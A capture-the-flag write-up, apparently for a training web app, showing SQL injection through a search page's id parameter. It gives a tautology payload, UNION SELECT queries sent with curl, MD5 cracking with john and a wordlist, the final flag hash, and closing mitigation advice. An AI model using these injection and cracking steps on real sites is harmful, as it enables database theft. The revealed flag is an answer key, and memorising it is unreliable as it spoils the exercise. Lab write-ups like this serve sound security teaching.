# SQL Injection in `/searchimg` — Exploit Writeup

## Overview

This writeup shows how to leverage a SQL injection vulnerability in the `searchimg` page to extract a flag‑generation instruction and derive the final flag.

---

## 1. Identify the Injection Point

The `searchimg` endpoint takes an `id` parameter and (unsafely) interpolates it into a query such as:

```sql
SELECT * 
  FROM list_images 
 WHERE id = <user_input>;

By supplying id=0=0, you inject a tautology:

SELECT * 
  FROM list_images 
 WHERE id = 0=0;

This returns all rows from list_images.
2. Dump All Columns via UNION SELECT

Once you know you can inject, use UNION to pull arbitrary columns. Suppose list_images has at least these fields:

    url

    id

    title

    comment

You can combine them in one query:

?page=searchimg
  &id=0=0
    UNION SELECT url, id      FROM list_images
    UNION SELECT url, title   FROM list_images
    UNION SELECT url, comment FROM list_images
&Submit=Submit

3. Use curl and Filter for “flag”

curl "$TARGET_IP/?page=searchimg&\
id=0%3D0+UNION+SELECT+url%2C+id+FROM+list_images+\
UNION+SELECT+url%2C+title+FROM+list_images+\
UNION+SELECT+url%2C+comment+FROM+list_images&Submit=Submit#" \
  | grep -i flag

This reveals one critical row:
<pre> Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46 Url : borntosec.ddns.net/images.png </pre>

From that we learn:

    MD5 hash to crack: 1928e8083cf461a51303633093573c46

    Instructions: “md5 decode → lowercase → sha256”

4. Crack the MD5

Use your favorite MD5‑reversal tool or an online service. For example:

echo '1928e8083cf461a51303633093573c46' > h.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt h.txt

Recovered plaintext:

albatroz

5. Normalize & Compute SHA‑256

Lowercase the cracked word (already lowercase), then compute its SHA‑256 digest:

echo -n "albatroz" \
  | sha256sum \
  | awk '{print $1}'

Result:

f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

6. Final Flag

f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

Mitigation Recommendations

    Parameterized Queries
    Never concatenate user input into SQL. Use prepared statements with placeholders.

    Strict Input Validation
    Enforce numeric type checks and allow‑lists for ID parameters.

    Least Privilege
    Give your database user only the minimum permissions required.

    Error Suppression
    Disable verbose SQL errors in production to avoid leaking schema details.

::contentReference[oaicite:0]{index=0}